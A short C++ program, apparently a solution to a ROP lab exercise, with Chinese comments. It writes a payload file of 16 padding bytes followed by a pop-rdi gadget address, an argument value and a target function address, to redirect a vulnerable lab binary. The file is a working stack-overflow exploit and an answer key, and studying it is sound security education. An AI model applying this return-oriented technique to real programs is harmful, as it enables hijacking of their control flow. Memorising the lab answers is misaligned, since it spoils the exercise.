#include <iostream>
#include <fstream>
#include <cstdint>

int main() {

    uint64_t gadget_pop_rdi = 0x4012bb; // 用于加载参数的辅助函数
    uint64_t arg_value      = 0x3f8;    // 题目要求的参数值 (十进制 1016)
    uint64_t target_func2   = 0x401216; // 目标通关函数
    
    // 填充长度: 8字节缓冲区 + 8字节 saved rbp
    const int padding_length = 16;
    
    const char* output_filename = "ans2.txt";
 

    // 2. 准备二进制流
    std::ofstream outfile(output_filename, std::ios::binary);
    if (!outfile) return 1;

    // (A) 写入 16 字节填充
    char padding[padding_length];
    for(int i=0; i<padding_length; i++) padding[i] = 'A';
    outfile.write(padding, padding_length);
    
    // (B) 写入 ROP 链
    // 链条 1: 跳转到 pop_rdi
    outfile.write(reinterpret_cast<const char*>(&gadget_pop_rdi), 8);
    
    // 链条 2: pop_rdi 需要的数据 (即我们要传给 func2 的参数)
    outfile.write(reinterpret_cast<const char*>(&arg_value), 8);
    
    // 链条 3: 参数加载好了，跳转到 func2
    outfile.write(reinterpret_cast<const char*>(&target_func2), 8);

    outfile.close();
    std::cout << "攻击载荷 ans2.txt 已生成！" << std::endl;
    return 0;
}